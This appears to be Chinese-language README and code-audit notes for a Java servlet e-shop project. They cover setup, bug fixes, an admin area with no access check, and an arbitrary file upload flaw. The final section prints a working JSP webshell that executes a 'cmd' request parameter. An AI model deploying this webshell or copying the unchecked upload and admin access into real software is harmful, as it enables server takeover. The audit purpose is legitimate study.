# 原项目说明
- 没有使用框架，采用servlet和JDBC进行开发
- sql文件夹里存放的是mysql建表，src文件夹里的是java代码，WEBCONTENT里的是页面。
- 实现了用户的注册、邮件激活、登陆、支付、商品的添加搜索和显示等功能

# 项目页面如下：

![image](images/index.png)
![image](images/login.png)
![image](images/item.png)

# 审计

## 环境：

```
java8
mysql-5.7.34
apache-tomcat-9.0.113
```

## 数据库配置：

对c3p0-config.xml配置

```
<?xml version="1.0" encoding="UTF-8"?>
<c3p0-config>
	<default-config>
		<property name="user">root</property>
		<property name="password"></property>
		<property name="driverClass">com.mysql.jdbc.Driver</property>
		<property name="jdbcUrl">jdbc:mysql://localhost:3307/shop</property>
	</default-config> 
</c3p0-config> 
```



## （1）不要把项目路径设置为空，登录会有问题

## （2）注册有问题

register.jsp有一行代码

![image-20251218112445997](D:\documentation\image\image-20251218112445997.png)

这里如果没有写上method="post"，浏览器 **默认用 GET**就会直接提交。

如：

```
http://localhost:8080/e-shop/user?username=qqq&password=123456&confirmpwd=123456&email=a@qq.com&name=s&sex=mail&birthday=2025-12-01&varifyCode=人山人海&submit=注册
```

修改之后，正常的请求：

```
http://localhost:8080/e-shop/user?method=userRegister
```

## （3）user.setUid设置有问题

![image-20251218114059054](D:\documentation\image\image-20251218114059054.png)

修改前：直接传入一个uuid，会导致uid长度过长，导致into不进去。

![image-20251218114148412](D:\documentation\image\image-20251218114148412.png)

修改后：

去除横杆就好。

```
user.setUid( UUID.randomUUID().toString().replace("-", ""));
```

## （4）后台根本没校验

直接访问

```
http://localhost:8080/e-shop/admin/index.jsp
```

![image-20251218141449787](D:\documentation\image\image-20251218141449787.png)

![image-20251218141503057](D:\documentation\image\image-20251218141503057.png)

action 直接指向 `home.jsp`，用户不管输什么直接访问后台 JSP。根本没经过servlet。

![image-20251218141603446](D:\documentation\image\image-20251218141603446.png)



## （5）上传文件，目录不存在异常

根本没有upload目录

![image-20251218144207524](D:\documentation\image\image-20251218144207524.png)

创建一个。这样是不行滴，它会生成到_war_explode下面，这个目录的内容由 IDEA 控制，你在运行时手动 / 代码创建的文件夹，**会被 IDEA 当成“非法变更”清掉**

所以结果就是：

- `mkdirs()` **执行了**
- 但 **马上被 IDEA 删除**
- 你肉眼看到 = “没创建成功”

```
//如果目录不存在，就创建
			File dir = new File(realPath);
			if (!dir.exists()) {
				dir.mkdirs();
			}
```

![image-20251218144552374](D:\documentation\image\image-20251218144552374.png)

这里手动在webcontent下面创建一个upload即可

![image-20251218150830756](D:\documentation\image\image-20251218150830756.png)

## （6）修复后，存在任意文件上传漏洞

一句话木马

```
<%@ page import="java.io.*" %>
<%
    Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));
//    System.out.println(process);
    InputStream inputStream = process.getInputStream();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
    String line;
    while ((line = bufferedReader.readLine()) != null){
        response.getWriter().println(line);
    }
%>

```

![image-20251218154023517](D:\documentation\image\image-20251218154023517.png)

漏洞点：

不做任何校验，直接存放到upload下面。

![image-20251218154102987](D:\documentation\image\image-20251218154102987.png)

